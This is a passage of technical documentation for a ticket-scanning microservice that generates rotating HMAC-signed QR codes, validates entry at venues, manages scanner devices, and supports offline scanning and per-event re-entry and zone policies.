# SCANNING SERVICE - COMPLETE DOCUMENTATION

**Last Updated:** October 14, 2025  
**Version:** 1.0.0  
**Status:** PRODUCTION READY ✅

---

## EXECUTIVE SUMMARY

**Scanning-service is the entry point security and validation system for the TicketToken platform.**

This service demonstrates:
- ✅ Rotating HMAC-based QR code generation (30-second expiry)
- ✅ Real-time ticket validation at venue entry points
- ✅ Offline scanning capabilities with manifest sync
- ✅ Multi-layered rate limiting (IP, device, staff-based)
- ✅ Comprehensive policy enforcement (duplicate detection, re-entry, zone access)
- ✅ Device management and authorization
- ✅ SQL injection prevention and security hardening
- ✅ Prometheus metrics for monitoring
- ✅ Complete audit trail of all scan attempts
- ✅ Zone-based access control (GA, VIP, BACKSTAGE, ALL)
- ✅ 23 organized files

**This is a SECURITY-CRITICAL, REAL-TIME validation system.**

---

## QUICK REFERENCE

- **Service:** scanning-service
- **Port:** 3007 (configurable via PORT env)
- **Framework:** Express.js
- **Database:** PostgreSQL (tickettoken_db)
- **Cache:** Redis
- **Language:** TypeScript + JavaScript (hybrid)
- **QR Library:** qrcode
- **Security:** HMAC-SHA256, rate limiting, SQL injection prevention

---

## BUSINESS PURPOSE

### What This Service Does

**Core Responsibilities:**
1. Generate rotating QR codes for tickets (HMAC-based, 30-second expiry)
2. Validate ticket QR codes at venue entry points in real-time
3. Enforce scanning policies (duplicate window, re-entry rules, zone access)
4. Manage and authorize scanning devices (tablets, phones, dedicated scanners)
5. Support offline scanning with manifest sync for poor connectivity areas
6. Apply configurable policy templates per event
7. Track scan history and audit trail
8. Prevent fraud through rate limiting and velocity checking
9. Generate real-time metrics for venue operations
10. Reconcile offline scans when devices reconnect

**Business Value:**
- Venues can control entry and prevent ticket fraud
- Staff can scan tickets quickly (< 2 second validation)
- Offline mode ensures scanning works without internet
- Duplicate detection prevents ticket sharing
- Re-entry policies allow legitimate patron re-entry
- Zone enforcement keeps VIP areas secure
- Audit trail for security investigations
- Real-time metrics show entry flow

---

## ARCHITECTURE OVERVIEW

### Technology Stack

```
Runtime: Node.js 20 + TypeScript/JavaScript
Framework: Express.js
Database: PostgreSQL (via pg connection pool)
Cache: Redis (ioredis)
QR Generation: qrcode library
Crypto: Node.js crypto (HMAC-SHA256)
Validation: Manual validation (no Joi)
Monitoring: Prometheus (prom-client)
Logging: Winston
Security: Helmet, CORS, express-rate-limit
Testing: Jest
```

### Service Architecture Layers

```
┌─────────────────────────────────────────────────────────┐
│                    API LAYER (Express)                   │
│  Routes → Middleware → Services → Database               │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                   MIDDLEWARE LAYER                       │
│  • Rate Limiting (multi-level: IP, device, staff)        │
│  • Security Headers (Helmet)                             │
│  • CORS                                                  │
│  • Request Logging (Winston)                             │
│  • Error Handling                                        │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                    BUSINESS LOGIC                        │
│                                                          │
│  QR GENERATION:                                          │
│  ├─ QRGenerator (rotating HMAC codes)                    │
│  ├─ Offline manifest generation                          │
│  └─ Expiry management (30-second window)                 │
│                                                          │
│  VALIDATION:                                             │
│  ├─ QRValidator (HMAC verification)                      │
│  ├─ Duplicate detection (Redis + DB)                     │
│  ├─ Re-entry policy enforcement                          │
│  ├─ Zone access control                                  │
│  └─ Scan statistics                                      │
│                                                          │
│  DEVICE MANAGEMENT:                                      │
│  ├─ DeviceManager (registration, revocation)             │
│  └─ Offline capability tracking                          │
│                                                          │
│  OFFLINE MODE:                                           │
│  ├─ OfflineCache (manifest generation)                   │
│  ├─ Device sync tracking                                 │
│  └─ Scan reconciliation                                  │
│                                                          │
│  POLICY ENGINE:                                          │
│  ├─ Template application                                 │
│  ├─ Custom policy configuration                          │
│  └─ Event-specific rules                                 │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                    DATA LAYER                            │
│  • Tickets (scan counts, status)                         │
│  • Scans (audit log of all attempts)                     │
│  • Devices (authorization, zones)                        │
│  • Scan Policies (rules per event)                       │
│  • Offline Cache (validation hashes)                     │
│  • Scanner Devices (metadata, sync status)               │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                   MONITORING & LOGGING                   │
│  • Prometheus Metrics (scans, latency)                   │
│  • Winston Logs (structured JSON)                        │
│  • Scan Event Emission (real-time updates)               │
└─────────────────────────────────────────────────────────┘
```

---

## DATABASE SCHEMA

### Core Scanning Tables

**tickets** (managed by ticket-service, read by scanning)
```sql
- id (UUID, PK)
- ticket_number (VARCHAR, unique)
- event_id (UUID) → events
- user_id (UUID) → users
- status (ENUM: AVAILABLE, SOLD, MINTED, TRANSFERRED, CANCELLED, USED, EXPIRED)
- access_level (VARCHAR) - GA, VIP, BACKSTAGE, ALL
- section (VARCHAR, nullable)
- row_number (VARCHAR, nullable)
- seat_number (VARCHAR, nullable)
- scan_count (INTEGER, default 0)
- first_scanned_at (TIMESTAMP, nullable)
- last_scanned_at (TIMESTAMP, nullable)
- qr_hmac_secret (VARCHAR, nullable) - per-ticket HMAC secret
- created_at, updated_at (TIMESTAMP)

Indexes:
- ticket_number (unique lookups)
- event_id (event-based queries)
- user_id (user ticket lists)
- status (filtering)
```

**scans** (audit log - CRITICAL for security)
```sql
- id (UUID, PK)
- ticket_id (UUID) → tickets
- device_id (INTEGER) → devices
- result (ENUM: ALLOW, DENY, ERROR)
- reason (VARCHAR) - VALID_ENTRY, DUPLICATE, INVALID_QR, WRONG_ZONE, etc.
- scanned_at (TIMESTAMP, default NOW())
- metadata (JSONB, nullable) - additional scan context

Indexes:
- ticket_id, scanned_at (scan history)
- device_id, scanned_at (device activity)
- result, scanned_at (analytics)
- scanned_at DESC (recent scans)

CRITICAL: Never delete scans (audit trail for security/legal)
```

**devices** (scanning device authorization)
```sql
- id (SERIAL, PK)
- device_id (VARCHAR, unique) - SCANNER-ABC123
- name (VARCHAR) - "Main Gate Scanner 1"
- zone (VARCHAR) - GA, VIP, BACKSTAGE, ALL
- is_active (BOOLEAN, default true)
- created_at (TIMESTAMP)
- updated_at (TIMESTAMP)

Indexes:
- device_id (unique, fast lookup)
- is_active (filter active devices)
- zone (zone-based queries)

Note: Inactive devices cannot scan
```

**scanner_devices** (extended device metadata)
```sql
- id (UUID, PK)
- device_id (VARCHAR, unique)
- device_name (VARCHAR)
- device_type (VARCHAR) - mobile, tablet, dedicated
- venue_id (UUID) → venues
- registered_by (UUID) → users
- ip_address (INET, nullable)
- user_agent (TEXT, nullable)
- app_version (VARCHAR, nullable)
- can_scan_offline (BOOLEAN, default false)
- metadata (JSONB) - device info
- is_active (BOOLEAN, default true)
- last_sync_at (TIMESTAMP, nullable)
- registered_at (TIMESTAMP)
- revoked_at (TIMESTAMP, nullable)
- revoked_by (UUID, nullable)
- revoked_reason (TEXT, nullable)
- updated_at (TIMESTAMP)

Indexes:
- device_id (unique)
- venue_id (venue devices)
- is_active (active filter)
```

### Policy Tables

**scan_policies** (event-specific rules)
```sql
- id (SERIAL, PK)
- event_id (UUID) → events
- venue_id (UUID) → venues
- policy_type (ENUM: DUPLICATE_WINDOW, REENTRY, ZONE_ENFORCEMENT)
- name (VARCHAR)
- config (JSONB) - policy-specific configuration
- is_active (BOOLEAN, default true)
- created_at, updated_at (TIMESTAMP)

UNIQUE(event_id, policy_type)

Config Examples:
DUPLICATE_WINDOW: {"window_minutes": 10}
REENTRY: {"enabled": true, "cooldown_minutes": 30, "max_reentries": 2}
ZONE_ENFORCEMENT: {"strict": true, "vip_all_access": false}
```

**scan_policy_templates** (reusable policy sets)
```sql
- id (SERIAL, PK)
- name (VARCHAR) - "Standard Event", "Festival Multi-Day", etc.
- description (TEXT)
- policy_set (JSONB) - complete policy configuration
- is_default (BOOLEAN, default false)
- created_at, updated_at (TIMESTAMP)

Example policy_set:
{
  "duplicate_window": {"window_minutes": 10},
  "reentry": {"enabled": false},
  "zone_enforcement": {"strict": true, "vip_all_access": false}
}
```

### Offline Scanning Tables

**offline_validation_cache** (offline manifest data)
```sql
- id (SERIAL, PK)
- ticket_id (UUID) → tickets
- event_id (UUID) → events
- validation_hash (VARCHAR) - HMAC for offline validation
- valid_from (TIMESTAMP)
- valid_until (TIMESTAMP) - typically 4 hours after generation
- ticket_data (JSONB) - snapshot of ticket info
- created_at (TIMESTAMP)

UNIQUE(ticket_id, valid_from)

Indexes:
- event_id, valid_from, valid_until (manifest queries)
- ticket_id (ticket lookups)
- valid_until (cleanup old caches)

ticket_data structure:
{
  "ticketNumber": "TKT-2024-001234",
  "status": "SOLD",
  "section": "A",
  "row": "12",
  "seat": "5",
  "eventName": "Concert Name"
}
```

### Events Table (read-only reference)

**events** (managed by event-service)
```sql
- id (UUID, PK)
- venue_id (UUID) → venues
- name (VARCHAR) - OR title (VARCHAR) - BOTH supported
- starts_at (TIMESTAMP) - OR start_date (TIMESTAMP) - BOTH supported
- ends_at (TIMESTAMP, nullable)
- status (VARCHAR)
- created_at, updated_at (TIMESTAMP)

Note: Schema variations handled in queries (name/title, starts_at/start_date)
```

---

## API ENDPOINTS

### Health & Monitoring

#### **1. Basic Health Check**
```
GET /health

Response: 200
{
  "status": "healthy",
  "service": "scanning-service",
  "timestamp": "2025-10-14T10:30:00.000Z"
}

Use: Load balancer health checks
```

#### **2. Database Health Check**
```
GET /health/db

Response: 200
{
  "status": "ok",
  "database": "connected",
  "service": "scanning-service"
}

Response: 503 (if DB down)
{
  "status": "error",
  "database": "disconnected",
  "error": "connection timeout",
  "service": "scanning-service"
}

Use: Deep health check for monitoring
```

#### **3. Prometheus Metrics**
```
GET /metrics

Response: 200 (text/plain, Prometheus format)
# HELP scans_allowed_total Total number of allowed scans
# TYPE scans_allowed_total counter
scans_allowed_total 1250

# HELP scans_denied_total Total number of denied scans
# TYPE scans_denied_total counter
scans_denied_total{reason="DUPLICATE"} 15
scans_denied_total{reason="INVALID_QR"} 8
scans_denied_total{reason="WRONG_ZONE"} 3

# HELP scan_latency_seconds Scan operation latency
# TYPE scan_latency_seconds histogram
scan_latency_seconds_bucket{le="0.1"} 1200
scan_latency_seconds_bucket{le="0.5"} 1250
scan_latency_seconds_bucket{le="1"} 1250

# HELP qr_generation_duration_seconds QR generation time
# TYPE qr_generation_duration_seconds histogram
...

Use: Grafana dashboards, alerting
```

### QR Code Generation

#### **4. Generate QR Code**
```
GET /api/qr/generate/:ticketId

Parameters:
- ticketId (path, UUID) - ticket to generate QR for

Response: 200
{
  "success": true,
  "qr_data": "550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5b2c1d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6",
  "qr_image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
  "expires_at": "2025-10-14T10:30:30.000Z",
  "ticket": {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "ticket_number": "TKT-2024-001234",
    "event_name": "Summer Music Festival",
    "event_date": "2025-07-15T19:00:00.000Z",
    "access_level": "VIP"
  }
}

Response: 500 (ticket not found or query error)
{
  "success": false,
  "error": "QR_GENERATION_ERROR",
  "message": "Ticket not found"
}

QR Data Format: {ticketId}:{timestamp}:{hmac}
- ticketId: UUID of ticket
- timestamp: Unix timestamp in milliseconds
- hmac: HMAC-SHA256(ticketId:timestamp, HMAC_SECRET)

Security:
- QR expires after 30 seconds (QR_ROTATION_SECONDS env var)
- HMAC prevents tampering
- Must generate new QR for each scan attempt
- QR image: 300x300px PNG, base64 encoded
```

#### **5. Validate QR Format**
```
POST /api/qr/validate

Body:
{
  "qr_data": "550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5..."
}

Response: 200 (valid format)
{
  "success": true,
  "valid": true
}

Response: 400 (invalid format)
{
  "success": false,
  "error": "INVALID_QR_FORMAT"
}

Note: This only validates FORMAT, not HMAC or expiry
Use: Quick client-side validation before submission
```

### Ticket Scanning (CRITICAL ENDPOINT)

#### **6. Scan Ticket**
```
POST /api/scan

Rate Limits:
- 10 scans per minute per IP/device combo (scanRateLimiter)
- Combined with device and staff limits
- 429 response if exceeded

Headers:
(None required for public access, but typically secured)

Body:
{
  "qr_data": "550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5...",
  "device_id": "SCANNER-ABC123",
  "location": "Main Entrance - Gate A",  // optional
  "staff_user_id": "staff-uuid-here"     // optional
}

Response: 200 (ALLOW - entry permitted)
{
  "valid": true,
  "result": "ALLOW",
  "message": "Entry allowed",
  "ticket": {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "event_name": "Summer Music Festival",
    "ticket_number": "TKT-2024-001234",
    "access_level": "VIP"
  },
  "scan_count": 1
}

Response: 400 (DENY - entry denied)
{
  "valid": false,
  "result": "DENY",
  "reason": "DUPLICATE",
  "message": "Ticket already scanned"
}

Response: 400 (missing parameters)
{
  "success": false,
  "error": "MISSING_PARAMETERS",
  "message": "qr_data and device_id are required"
}

Response: 500 (system error)
{
  "success": false,
  "error": "INTERNAL_ERROR",
  "message": "Failed to process scan"
}

Response: 429 (rate limit)
{
  "message": "Too many scan attempts. Please wait before trying again."
}

DENY Reasons (full list):
- QR_EXPIRED: QR code older than 30 seconds
- INVALID_QR: HMAC validation failed (tampered)
- UNAUTHORIZED_DEVICE: Device not registered or inactive
- TICKET_NOT_FOUND: Ticket doesn't exist in database
- INVALID_STATUS: Ticket status not SOLD or MINTED
- WRONG_ZONE: Access level doesn't match device zone
- DUPLICATE: Scanned within duplicate window
- NO_REENTRY: Re-entry not allowed for this event
- REENTRY_DISABLED: Re-entry policy is disabled
- COOLDOWN_ACTIVE: Must wait X minutes before re-entry
- MAX_REENTRIES_REACHED: Exceeded max re-entry count

Validation Flow:
1. Parse QR data (ticketId:timestamp:hmac)
2. Verify HMAC signature
3. Check timestamp (must be ≤ 30 seconds old)
4. Validate device authorization (active + correct zone)
5. Check ticket exists and is valid status
6. Verify access zone permissions
7. Check duplicate scan window (Redis + DB)
8. Apply re-entry policies if applicable
9. Log scan attempt to scans table
10. Update ticket scan_count
11. Cache in Redis for duplicate detection
12. Emit scan event (for real-time dashboards)
13. Record metrics (Prometheus)

Performance Target: < 500ms response time
Security: ISSUE #26 fixes applied (rate limiting, logging)
```

#### **7. Bulk Scan (Not Implemented)**
```
POST /api/scan/bulk

Rate Limits:
- 5 bulk requests per 5 minutes (bulkScanRateLimiter)

Response: 501
{
  "error": "Bulk scanning not implemented"
}

Future: Batch QR validation for offline reconciliation
```

### Device Management

#### **8. List Devices**
```
GET /api/devices

Response: 200
{
  "success": true,
  "devices": [
    {
      "id": "1",
      "device_id": "SCANNER-ABC123",
      "name": "Main Gate Scanner 1",
      "zone": "GA",
      "is_active": true,
      "created_at": "2025-01-01T00:00:00.000Z",
      "updated_at": "2025-10-14T10:00:00.000Z"
    },
    {
      "id": "2",
      "device_id": "SCANNER-XYZ789",
      "name": "VIP Entrance Scanner",
      "zone": "VIP",
      "is_active": true,
      "created_at": "2025-01-01T00:00:00.000Z",
      "updated_at": "2025-10-14T09:00:00.000Z"
    }
  ]
}

Response: 500 (query error)
{
  "success": false,
  "error": "DEVICE_LIST_ERROR"
}

Note: Only returns active devices (is_active = true)
Use: Venue management dashboards, device monitoring
```

#### **9. Register Device**
```
POST /api/devices/register

Body:
{
  "device_id": "SCANNER-ABC123",  // unique identifier
  "name": "Main Gate Scanner 1",
  "zone": "GA"  // optional, defaults to GA
}

Response: 200 (new device)
{
  "success": true,
  "device": {
    "id": "3",
    "device_id": "SCANNER-ABC123",
    "name": "Main Gate Scanner 1",
    "zone": "GA",
    "is_active": true,
    "created_at": "2025-10-14T10:30:00.000Z",
    "updated_at": "2025-10-14T10:30:00.000Z"
  }
}

Response: 200 (existing device updated)
{
  "success": true,
  "device": {
    "id": "1",
    "device_id": "SCANNER-ABC123",
    "name": "Main Gate Scanner 1 (Updated)",
    "zone": "VIP",
    "is_active": true,
    "updated_at": "2025-10-14T10:30:00.000Z"
  }
}

Response: 400 (missing parameters)
{
  "success": false,
  "error": "MISSING_PARAMETERS"
}

Response: 500 (database error)
{
  "success": false,
  "error": "REGISTRATION_ERROR"
}

Zone Options:
- GA: General Admission
- VIP: VIP sections only
- BACKSTAGE: Backstage access
- ALL: All zones

Behavior:
- ON CONFLICT (device_id): Updates existing device
- Reactivates if previously inactive
- Updates name and zone
- Sets updated_at timestamp

Security: No authentication required (internal network only)
Future: Add API key or JWT auth
```

### Offline Scanning

#### **10. Get Offline Manifest**
```
GET /api/offline/manifest/:eventId?device_id=SCANNER-ABC123

Parameters:
- eventId (path, UUID) - event to sync
- device_id (query, required) - device requesting manifest

Response: 200
{
  "success": true,
  "manifest": {
    "event_id": "event-uuid-here",
    "device_id": "SCANNER-ABC123",
    "generated_at": "2025-10-14T10:00:00.000Z",
    "expires_at": "2025-10-14T14:00:00.000Z",  // 4 hours
    "tickets": {
      "ticket-uuid-1": {
        "ticket_number": "TKT-2024-001234",
        "access_level": "GA",
        "scan_count": 0,
        "last_scanned_at": null,
        "offline_token": "hmac-hash-for-offline-validation"
      },
      "ticket-uuid-2": {
        "ticket_number": "TKT-2024-001235",
        "access_level": "VIP",
        "scan_count": 1,
        "last_scanned_at": "2025-10-14T09:30:00.000Z",
        "offline_token": "hmac-hash-for-offline-validation"
      }
    }
  }
}

Response: 400 (missing device_id)
{
  "success": false,
  "error": "MISSING_DEVICE_ID"
}

Response: 500 (generation error)
{
  "success": false,
  "error": "MANIFEST_ERROR"
}

Offline Token Format:
HMAC-SHA256(ticketId:eventId:offline, HMAC_SECRET)

Manifest Includes:
- All tickets with status SOLD or MINTED
- Current scan counts
- Last scan timestamps
- Offline validation tokens

Usage Pattern:
1. Device downloads manifest before event
2. Stores locally for offline validation
3. Validates tickets using offline_token
4. Records scans locally
5. Syncs back when online (reconciliation)

Expiry: 4 hours (configurable)
Security: Device must be authorized for offline scanning
```

#### **11. Reconcile Offline Scans**
```
POST /api/offline/reconcile

Body:
{
  "device_id": "SCANNER-ABC123",
  "scans": [
    {
      "ticket_id": "ticket-uuid-1",
      "result": "ALLOW",
      "reason": "VALID_ENTRY",
      "scanned_at": "2025-10-14T10:15:00.000Z",
      "scan_count": 1
    },
    {
      "ticket_id": "ticket-uuid-2",
      "result": "ALLOW",
      "reason": "VALID_ENTRY",
      "scanned_at": "2025-10-14T10:16:00.000Z",
      "scan_count": 1
    },
    {
      "ticket_id": "ticket-uuid-3",
      "result": "DENY",
      "reason": "DUPLICATE",
      "scanned_at": "2025-10-14T10:17:00.000Z"
    }
  ]
}

Response: 200
{
  "success": true,
  "reconciled": 2,
  "failed": 1,
  "results": [
    {
      "ticket_id": "ticket-uuid-1",
      "status": "SUCCESS",
      "message": "Scan reconciled"
    },
    {
      "ticket_id": "ticket-uuid-2",
      "status": "SUCCESS",
      "message": "Scan reconciled"
    },
    {
      "ticket_id": "ticket-uuid-3",
      "status": "DUPLICATE",
      "message": "Already processed"
    }
  ]
}

Response: 400 (invalid request)
{
  "success": false,
  "error": "INVALID_REQUEST"
}

Response: 500 (reconciliation error)
{
  "success": false,
  "error": "RECONCILIATION_ERROR"
}

Reconciliation Process (Transactional):
1. BEGIN transaction
2. For each scan:
   a. Check if already processed (duplicate detection)
   b. Validate device exists
   c. Insert scan record into scans table
   d. Update ticket scan_count if ALLOW
   e. Track result (SUCCESS/DUPLICATE/ERROR)
3. COMMIT transaction
4. Return results summary

Duplicate Detection:
- Checks scans table for existing record
- Matches: ticket_id + scanned_at timestamp
- Prevents double-counting offline scans

Error Handling:
- Transaction rolls back on failure
- Individual scan errors don't stop batch
- Returns detailed results per scan

Use Case:
- Device was offline during event
- Collected scans locally
- Syncs back when connectivity restored
- Updates central database
```

### Scan Policies

#### **12. List Policy Templates**
```
GET /api/policies/templates

Response: 200
{
  "success": true,
  "templates": [
    {
      "id": "1",
      "name": "Standard Event",
      "description": "10min duplicate window, no re-entry",
      "policy_set": {
        "duplicate_window": {"window_minutes": 10},
        "reentry": {"enabled": false},
        "zone_enforcement": {"strict": true, "vip_all_access": false}
      },
      "is_default": true
    },
    {
      "id": "2",
      "name": "Festival Multi-Day",
      "description": "15min duplicate window, re-entry allowed",
      "policy_set": {
        "duplicate_window": {"window_minutes": 15},
        "reentry": {
          "enabled": true,
          "cooldown_minutes": 30,
          "max_reentries": 5
        },
        "zone_enforcement": {"strict": false, "vip_all_access": false}
      },
      "is_default": false
    },
    {
      "id": "3",
      "name": "Stadium Event",
      "description": "5min duplicate window, strict zones",
      "policy_set": {
        "duplicate_window": {"window_minutes": 5},
        "reentry": {"enabled": false},
        "zone_enforcement": {"strict": true, "vip_all_access": false}
      },
      "is_default": false
    }
  ]
}

Response: 500 (database error)
{
  "success": false,
  "error": "FETCH_ERROR"
}

Templates Included:
- Standard Event (default)
- Festival Multi-Day
- Stadium Event
- Club/Venue
- Conference

Use: Event organizers select template when creating event
```

#### **13. Get Event Policies**
```
GET /api/policies/event/:eventId

Parameters:
- eventId (path, UUID)

Response: 200
{
  "success": true,
  "policies": [
    {
      "id": "1",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "DUPLICATE_WINDOW",
      "name": "Standard - Duplicate Window",
      "config": {
        "window_minutes": 10
      },
      "is_active": true,
      "event_name": "Summer Music Festival",
      "venue_name": "Central Park",
      "created_at": "2025-01-01T00:00:00.000Z",
      "updated_at": "2025-10-14T10:00:00.000Z"
    },
    {
      "id": "2",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "REENTRY",
      "name": "Standard - Re-entry",
      "config": {
        "enabled": false
      },
      "is_active": true,
      "event_name": "Summer Music Festival",
      "venue_name": "Central Park"
    },
    {
      "id": "3",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "ZONE_ENFORCEMENT",
      "name": "Standard - Zone Access",
      "config": {
        "strict": true,
        "vip_all_access": false
      },
      "is_active": true,
      "event_name": "Summer Music Festival",
      "venue_name": "Central Park"
    }
  ]
}

Response: 500 (database error)
{
  "success": false,
  "error": "FETCH_ERROR"
}

Policy Types:
- DUPLICATE_WINDOW: Time window for duplicate detection
- REENTRY: Re-entry rules and cooldowns
- ZONE_ENFORCEMENT: Access zone restrictions

Note: One policy per type per event
```

#### **14. Apply Policy Template**
```
POST /api/policies/event/:eventId/apply-template

Parameters:
- eventId (path, UUID)

Body:
{
  "template_id": "1"
}

Response: 200
{
  "success": true,
  "message": "Policy template applied successfully",
  "policies": [
    {
      "id": "1",
      "event_id": "event-uuid",
      "policy_type": "DUPLICATE_WINDOW",
      "config": {"window_minutes": 10},
      "is_active": true
    },
    {
      "id": "2",
      "event_id": "event-uuid",
      "policy_type": "REENTRY",
      "config": {"enabled": false},
      "is_active": true
    },
    {
      "id": "3",
      "event_id": "event-uuid",
      "policy_type": "ZONE_ENFORCEMENT",
      "config": {"strict": true, "vip_all_access": false},
      "is_active": true
    }
  ]
}

Response: 400 (missing template_id)
{
  "success": false,
  "error": "MISSING_TEMPLATE_ID"
}

Response: 500 (application error)
{
  "success": false,
  "error": "APPLY_ERROR",
  "message": "Database error message"
}

Process:
1. Calls PostgreSQL function: apply_scan_policy_template(event_id, template_id)
2. Function creates/updates all policy types
3. Returns updated policies
4. Transaction ensures atomic update

Use: Quick setup of standard policies for new events
```

#### **15. Set Custom Policies**
```
PUT /api/policies/event/:eventId/custom

Parameters:
- eventId (path, UUID)

Body:
{
  "duplicate_window_minutes": 15,
  "reentry_enabled": true,
  "reentry_cooldown_minutes": 30,
  "max_reentries": 2,
  "strict_zones": true,
  "vip_all_access": false
}

Response: 200
{
  "success": true,
  "message": "Custom policies applied successfully",
  "policies": [
    {
      "id": "1",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "DUPLICATE_WINDOW",
      "config": {"window_minutes": 15},
      "name": "Custom - Duplicate Window",
      "is_active": true
    },
    {
      "id": "2",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "REENTRY",
      "config": {
        "enabled": true,
        "cooldown_minutes": 30,
        "max_reentries": 2
      },
      "name": "Custom - Re-entry",
      "is_active": true
    },
    {
      "id": "3",
      "event_id": "event-uuid",
      "venue_id": "venue-uuid",
      "policy_type": "ZONE_ENFORCEMENT",
      "config": {
        "strict": true,
        "vip_all_access": false
      },
      "name": "Custom - Zone Access",
      "is_active": true
    }
  ]
}

Response: 404 (event not found)
{
  "success": false,
  "error": "EVENT_NOT_FOUND",
  "message": "Event not found"
}

Response: 500 (update error)
{
  "success": false,
  "error": "UPDATE_ERROR",
  "message": "Database error message"
}

Process (Transactional):
1. BEGIN transaction
2. Get venue_id from event
3. INSERT or UPDATE duplicate window policy
4. INSERT or UPDATE re-entry policy
5. INSERT or UPDATE zone enforcement policy
6. COMMIT transaction
7. Fetch and return updated policies

Parameters (all optional):
- duplicate_window_minutes: 1-60 (default: 10)
- reentry_enabled: boolean (default: false)
- reentry_cooldown_minutes: 1-1440 (default: 15)
- max_reentries: 1-99 (default: 2)
- strict_zones: boolean (default: true)
- vip_all_access: boolean (default: false)

Use: Fine-tune policies for specific event needs
```

---

## DEPENDENCIES

### What This Service NEEDS (Upstream)

```
REQUIRED (Service fails without these):
├── PostgreSQL (localhost:5432)
│   └── Database: tickettoken_db
│   └── Tables: tickets, events, scans, devices, scan_policies, etc.
│   └── Breaking: Service won't start, queries fail
│
├── Redis (localhost:6379)
│   └── Duplicate detection cache
│   └── Rate limiting
│   └── Breaking: Duplicate detection fails, rate limiting disabled
│
└── HMAC_SECRET (environment variable)
    └── QR code signature generation/validation
    └── Breaking: QR codes can't be generated or validated

OPTIONAL (Service works without these):
├── Event Service (port 3003)
│   └── Event details for QR generation
│   └── Breaking: QR generation fails if event data missing
│
├── Ticket Service (port 3004)
│   └── Ticket creation/updates
│   └── Breaking: Read-only operations continue
│
└── Notification Service (port 3008)
    └── Scan event notifications
    └── Breaking: No real-time alerts, scanning continues
```

### What DEPENDS On This Service (Downstream)

```
DIRECT DEPENDENCIES:
├── Mobile Apps (iOS/Android)
│   └── QR code display for patrons
│   └── Calls: GET /api/qr/generate/:ticketId
│   └── Impact: Patrons can't display tickets
│
├── Scanner Apps (iOS/Android/Web)
│   └── Real-time ticket validation
│   └── Calls: POST /api/scan
│   └── Impact: Venue entry stops, manual validation required
│
├── Venue Management Dashboard
│   └── Device management, policy configuration
│   └── Calls: GET /api/devices, POST /api/policies/*
│   └── Impact: Can't configure policies, can't monitor devices
│
├── Analytics Service (port 3010)
│   └── Entry metrics and reporting
│   └── Reads: scans table
│   └── Impact: No entry analytics
│
└── Monitoring Dashboards (Grafana)
    └── Real-time scan metrics
    └── Calls: GET /metrics
    └── Impact: No scan monitoring

BLAST RADIUS: HIGH
- If scanning-service is down:
  ✗ Cannot scan tickets (patrons can't enter venue)
  ✗ No QR code generation (patrons can't display tickets)
  ✗ No entry metrics
  ✗ Offline scanning still works (devices have cached manifests)
  ✓ Other services (purchasing, browsing) continue working
  
MITIGATION:
- Offline scanning capability (4-hour manifest cache)
- Manual validation procedures (backup process)
- Rapid rollback procedures
```

---

## CRITICAL FEATURES

### 1. Rotating HMAC QR Codes ✅

**Implementation:**
```typescript
// 30-second expiring QR codes with HMAC-SHA256

QR Data Format:
ticketId:timestamp:hmac

Example:
550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5b2c1...

Generation:
1. Get current timestamp (milliseconds)
2. Concatenate: ticketId + ":" + timestamp
3. Generate HMAC: HMAC-SHA256(data, HMAC_SECRET)
4. Concatenate: ticketId + ":" + timestamp + ":" + hmac
5. Generate QR code image (300x300 PNG)
6. Calculate expiry: timestamp + 30 seconds

Validation:
1. Parse QR data (split by ":")
2. Extract ticketId, timestamp, provided_hmac
3. Check age: now - timestamp ≤ 30 seconds
4. Recalculate HMAC: HMAC-SHA256(ticketId:timestamp, HMAC_SECRET)
5. Compare: recalculated_hmac === provided_hmac
6. Reject if expired or HMAC mismatch

Code: src/services/QRGenerator.ts, src/services/QRValidator.ts
```

**Why it matters:**
- Prevents screenshot sharing (expires in 30 seconds)
- Prevents tampering (HMAC signature)
- Prevents ticket duplication
- Forces patrons to generate fresh QR at entry

**Security Properties:**
- Forward secrecy: Old QRs can't be reused
- Tamper-proof: Can't modify ticketId or timestamp
- Cryptographically secure: SHA-256 collision resistance

### 2. Duplicate Detection ✅

**Implementation:**
```typescript
// Two-tier caching: Redis (fast) + PostgreSQL (persistent)

Check Flow:
1. Check Redis: scan:duplicate:{ticketId}
   - Key exists? → DUPLICATE (instant rejection)
   - Cached last scan timestamp
   
2. Check PostgreSQL (if Redis miss):
   - Query scans table
   - WHERE ticket_id = ? AND result = 'ALLOW'
   - AND scanned_at > NOW() - INTERVAL '{window_minutes} minutes'
   - ORDER BY scanned_at DESC LIMIT 1
   
3. Cache in Redis:
   - SET scan:duplicate:{ticketId} = timestamp
   - EXPIRE {window_minutes * 60} seconds

Record Scan:
1. INSERT INTO scans (ticket_id, device_id, result, reason)
2. UPDATE tickets SET scan_count = scan_count + 1
3. SET Redis cache

Code: src/services/QRValidator.ts (checkDuplicate method)
```

**Why it matters:**
- Prevents ticket sharing within event
- Configurable window (5-30 minutes typical)
- Fast rejection (Redis < 5ms)
- Persistent audit trail (PostgreSQL)

**Configuration:**
- Window per event via scan_policies table
- Default: 10 minutes
- Range: 1-60 minutes

### 3. Re-entry Policies ✅

**Implementation:**
```typescript
// Configurable per-event re-entry rules

Policy Config (JSON):
{
  "enabled": true,
  "cooldown_minutes": 30,
  "max_reentries": 2
}

Validation Flow:
1. Check if duplicate scan detected
2. If duplicate, check re-entry policy:
   a. Policy disabled? → DENY (NO_REENTRY)
